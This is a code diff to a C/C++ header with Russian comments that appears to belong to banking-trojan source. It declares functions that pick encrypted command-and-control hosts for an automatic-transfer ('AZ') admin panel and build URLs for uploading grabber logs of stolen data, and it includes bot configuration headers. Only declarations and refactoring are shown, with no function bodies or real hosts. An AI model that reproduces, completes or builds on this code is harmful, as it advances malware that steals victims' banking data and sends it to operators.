@@ -20,9 +20,8 @@
 
 #include "GetApi.h"
 #include "Strings.h"
-#include "Strings.h"
 #include "BotConfig.h"
-#include "JavaConfig.h"
+#include "Config.h"
 
 
 
@@ -35,7 +34,7 @@
 #define AZCONFIG_PARAM_NAME_SCRIPTHOSTS "__AZ_SCRIPTS_HOSTS__\0"
 #define AZCONFIG_PARAM_NAME_AZUSER      "_AZ_USER"
 
-#define AZCONFIG_PARAM_ENCRYPTED_HOSTS        true
+#define AZCONFIG_PARAM_ENCRYPTED_HOSTS        BOTPARAM_ENCRYPTED_MAINHOSTS
 #define AZCONFIG_PARAM_ENCRYPTED_SCRIPTHOSTS  true
 #define AZCONFIG_PARAM_ENCRYPTED_AZUSER       true
 
@@ -43,24 +42,65 @@
 
 
 
-//---------------------------------------------------
-//  GetAzUser - Функция возвращает имя пользователя
+//----------------------------------------
+//  GetAzUser
+//  Функция возвращает имя пользователя
 //  для систем автозалива
-//---------------------------------------------------
+//----------------------------------------
 string GetAzUser();
 
 
-//----------------------------------------------------
-// GetAzHost - Функция возвращает первый рабочий хост
-// из массива хостов системы AZ
-//----------------------------------------------------
-string GetAzHost();
+//----------------------------------------
+//  GetAzHostsBuf
+//   Фнкция возвращает казатель на бфер
+//   хостов админки автозалива. AZ админка
+//----------------------------------------
+PCHAR GetAzHostsBuf();
+
+
+//----------------------------------------
+//  IsAzHost
+//  функция возвращает истину если
+//  указанный хост принадлежит массиву
+//   хостов админки AZ
+//----------------------------------------
+bool IsAzHost(const char* Host);
+
+//----------------------------------------
+// GetAzHost
+//  Функция возвращает первый рабочий хост
+//  из массива хостов системы AZ
+//  Wait - указание ожидать рабочего хоста
+//----------------------------------------
+string GetAzHost(bool Wait = false);
 
 //----------------------------------------------------
-//  GetAzURL - Функция возвращает полный адрес на
+//  GetAzURL
+//   Функция возвращает полный адрес на
 //   основе Хоста системы и переданного пути
 //----------------------------------------------------
 string GetAzURL(const char*  Path);
+
+
+//----------------------------------------------------
+//  GetAzGrabberURLPath
+//   Функция возвращает путь URL для
+//   отправки лога грабера
+//----------------------------------------------------
+string GetAzGrabberURLPath(const string& SystemName,  const char* Action = NULL);
+
+
+//----------------------------------------------------
+//  GetAzGrabberURL
+//   Функция возвращает адрес в админке
+//   AZ для отправки лога грабера
+//----------------------------------------------------
+string GetAzGrabberURL(const string& SystemName,  const char* Action = NULL);
+
+
+
+
+
 
 
 
@@ -85,19 +125,6 @@ void AzCheckScriptHosts();
 string AzGetScriptHost();
 
 
-
-//------------------------------------------------------
-//  GetAzGrabberURLPath Функция возвращает путь URL для
-//  отправки лога грабера
-//------------------------------------------------------
-string GetAzGrabberURLPath(const string& SystemName,  const char* Action = NULL);
-
-
-//------------------------------------------------------
-//  GetAzGrabberURL - Функция возвращает адрес в админке
-//  AZ для отправки лога грабера
-//------------------------------------------------------
-string GetAzGrabberURL(const string& SystemName,  const char* Action = NULL);
 
 //---------------------------------------------------------------------------
 #endif
